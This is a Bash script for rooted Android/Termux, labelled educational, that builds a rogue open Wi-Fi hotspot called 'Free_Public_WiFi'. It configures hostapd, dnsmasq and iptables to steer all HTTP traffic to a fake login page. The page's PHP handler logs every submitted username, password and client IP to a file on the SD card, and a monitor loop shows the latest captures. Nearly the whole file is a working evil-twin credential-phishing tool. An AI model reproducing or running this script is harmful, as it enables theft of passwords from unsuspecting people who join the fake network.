#!/data/data/com.termux/files/usr/bin/bash

# ==============================================
# PORTAL CAUTIVO EDUCATIVO PARA TERMUX
# Script para demostraciones de seguridad
# Solo uso educativo - Requiere root
# ==============================================

# Colores para output
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Configuración
SSID="Free_Public_WiFi"
INTERFACE="wlan0"
HTML_DIR="/data/data/com.termux/files/usr/share/apache2/default-site/htdocs"
PORT="8080"
LOG_FILE="/sdcard/portal_capturas.log"

# Función para mostrar banner
show_banner() {
    clear
    echo -e "${CYAN}"
    echo "=========================================="
    echo "    PORTAL CAUTIVO EDUCATIVO"
    echo "    Demostración de Seguridad WiFi"
    echo "=========================================="
    echo -e "${NC}"
    echo -e "${YELLOW}⚠️  SOLO USO EDUCATIVO ⚠️${NC}"
    echo -e "${YELLOW}⚠️  REQUIERE ROOT ⚠️${NC}"
    echo ""
}

# Función para verificar root
check_root() {
    if [[ $(whoami) != "root" ]]; then
        echo -e "${RED}[ERROR] Este script requiere root. Ejecuta: su${NC}"
        exit 1
    fi
}

# Función para verificar dependencias
check_dependencies() {
    echo -e "${BLUE}[+] Verificando dependencias...${NC}"
    
    dependencies=("apache2" "php" "hostapd" "dnsmasq" "net-tools")
    
    for dep in "${dependencies[@]}"; do
        if ! pkg list-installed | grep -q "$dep"; then
            echo -e "${YELLOW}[!] Instalando $dep...${NC}"
            pkg install -y "$dep"
        fi
    done
    
    # Verificar si hostapd está compilado con nl80211
    if ! hostapd -v | grep -q "nl80211"; then
        echo -e "${YELLOW}[!] Compilando hostapd compatible...${NC}"
        compile_hostapd
    fi
}

# Compilar hostapd compatible
compile_hostapd() {
    pkg install -y git make gcc
    git clone https://github.com/termux/termux-packages
    cd termux-packages/packages/hostapd
    make && make install
    cd ~
}

# Configurar página de login
setup_login_page() {
    echo -e "${BLUE}[+] Configurando página de login...${NC}"
    
    # Crear directorio si no existe
    mkdir -p "$HTML_DIR"
    
    # Página de login HTML
    cat > "$HTML_DIR/index.html" << EOF
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login WiFi Público</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            width: 90%;
            max-width: 400px;
        }
        h2 {
            color: #333;
            text-align: center;
            margin-bottom: 20px;
        }
        .logo {
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            color: #667eea;
            margin-bottom: 20px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }
        input[type="submit"] {
            width: 100%;
            background: #667eea;
            color: white;
            padding: 14px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }
        input[type="submit"]:hover {
            background: #764ba2;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">🌐 WiFi Público</div>
        <h2>Iniciar Sesión</h2>
        <form method="POST" action="/login.php">
            <input type="text" name="username" placeholder="Usuario o Email" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <input type="submit" value="Conectar a Internet">
        </form>
        <div class="footer">
            Al conectarse, acepta los términos y condiciones del servicio
        </div>
    </div>
</body>
</html>
EOF

    # Script PHP para procesar login
    cat > "$HTML_DIR/login.php" << EOF
<?php
\$log_file = "/sdcard/portal_capturas.log";

if (\$_SERVER['REQUEST_METHOD'] === 'POST') {
    \$username = \$_POST['username'] ?? '';
    \$password = \$_POST['password'] ?? '';
    \$timestamp = date('Y-m-d H:i:s');
    \$ip = \$_SERVER['REMOTE_ADDR'] ?? 'Desconocido';
    
    \$log_entry = "[\$timestamp] IP: \$ip - Usuario: \$username - Contraseña: \$password\n";
    
    file_put_contents(\$log_file, \$log_entry, FILE_APPEND);
    
    // Redirigir a página de éxito (podría ser google.com en un escenario real)
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Conexión Exitosa</title>
        <meta http-equiv="refresh" content="3;url=https://www.google.com" />
        <style>
            body { 
                font-family: Arial; 
                background: linear-gradient(135deg, #4CAF50 0%, #2E7D32 100%);
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                color: white;
            }
            .message {
                background: rgba(255,255,255,0.9);
                padding: 30px;
                border-radius: 10px;
                text-align: center;
                color: #333;
            }
        </style>
    </head>
    <body>
        <div class="message">
            <h2>✅ Conexión Exitosa</h2>
            <p>Redirigiendo a Internet en 3 segundos...</p>
        </div>
    </body>
    </html>';
}
?>
EOF

    chmod -R 755 "$HTML_DIR"
}

# Configurar hostapd (Access Point)
setup_hostapd() {
    echo -e "${BLUE}[+] Configurando Access Point...${NC}"
    
    cat > /data/data/com.termux/files/usr/etc/hostapd/hostapd.conf << EOF
interface=$INTERFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
#wpa_passphrase=password123
#wpa_key_mgmt=WPA-PSK
#wpa_pairwise=TKIP
#rsn_pairwise=CCMP
EOF
}

# Configurar dnsmasq (DHCP + DNS)
setup_dnsmasq() {
    echo -e "${BLUE}[+] Configurando DNSMASQ...${NC}"
    
    cat > /data/data/com.termux/files/usr/etc/dnsmasq.conf << EOF
interface=$INTERFACE
dhcp-range=192.168.1.100,192.168.1.200,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
EOF
}

# Configurar reglas iptables
setup_iptables() {
    echo -e "${BLUE}[+] Configurando IPTables...${NC}"
    
    # Flush existing rules
    iptables -F
    iptables -t nat -F
    
    # Configure NAT
    iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
    iptables -A FORWARD -i wlan0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
    iptables -A FORWARD -i wlan0 -o wlan0 -j ACCEPT
    
    # Redirect all HTTP traffic to our portal
    iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port $PORT
}

# Iniciar servicios
start_services() {
    echo -e "${BLUE}[+] Iniciando servicios...${NC}"
    
    # Configurar interfaz
    ip link set dev $INTERFACE down
    ip addr add 192.168.1.1/24 dev $INTERFACE
    ip link set dev $INTERFACE up
    
    # Iniciar DNSMASQ
    dnsmasq -C /data/data/com.termux/files/usr/etc/dnsmasq.conf
    
    # Iniciar Apache en segundo plano
    apachectl start
    
    # Iniciar HostAPd
    echo -e "${YELLOW}[!] Iniciando Access Point...${NC}"
    echo -e "${GREEN}[+] SSID: $SSID${NC}"
    echo -e "${GREEN}[+] Portal: http://192.168.1.1${NC}"
    
    hostapd /data/data/com.termux/files/usr/etc/hostapd/hostapd.conf &
}

# Monitorear conexiones
monitor_connections() {
    echo -e "${BLUE}[+] Monitoreando conexiones...${NC}"
    echo -e "${YELLOW}Presiona Ctrl+C para detener${NC}"
    echo ""
    
    while true; do
        clear
        echo -e "${CYAN}=== MONITOR DE CONEXIONES ===${NC}"
        echo -e "${GREEN}SSID: ${SSID}${NC}"
        echo -e "${GREEN}Portal: http://192.168.1.1${NC}"
        echo -e "${GREEN}Clientes conectados:${NC}"
        
        # Mostrar clientes DHCP
        grep "DHCPACK" /var/log/dnsmasq.log 2>/dev/null | tail -5 || echo "No clients yet"
        
        echo ""
        echo -e "${CYAN}=== CAPTURAS RECIENTES ===${NC}"
        tail -5 "$LOG_FILE" 2>/dev/null || echo "No captures yet"
        
        echo ""
        echo -e "${YELLOW}Actualizando cada 5 segundos...${NC}"
        sleep 5
    done
}

# Limpiar y detener servicios
cleanup() {
    echo -e "${RED}[+] Deteniendo servicios...${NC}"
    
    killall hostapd dnsmasq apache2 2>/dev/null
    iptables -F
    iptables -t nat -F
    
    ip link set dev $INTERFACE down
    
    echo -e "${GREEN}[+] Limpieza completada${NC}"
}

# Función principal
main() {
    show_banner
    check_root
    
    echo -e "${GREEN}[1] Configurar portal cautivo${NC}"
    echo -e "${GREEN}[2] Solo monitorear capturas${NC}"
    echo -e "${GREEN}[3] Salir${NC}"
    
    read -p "Selecciona una opción: " choice
    
    case $choice in
        1)
            check_dependencies
            setup_login_page
            setup_hostapd
            setup_dnsmasq
            setup_iptables
            start_services
            monitor_connections
            ;;
        2)
            if [[ -f "$LOG_FILE" ]]; then
                watch -n 3 "tail -10 $LOG_FILE"
            else
                echo -e "${RED}[!] No hay archivo de capturas${NC}"
            fi
            ;;
        3)
            echo -e "${GREEN}[+] Saliendo...${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}[!] Opción inválida${NC}"
            ;;
    esac
}

# Manejar Ctrl+C
trap cleanup EXIT

# Ejecutar función principal
main
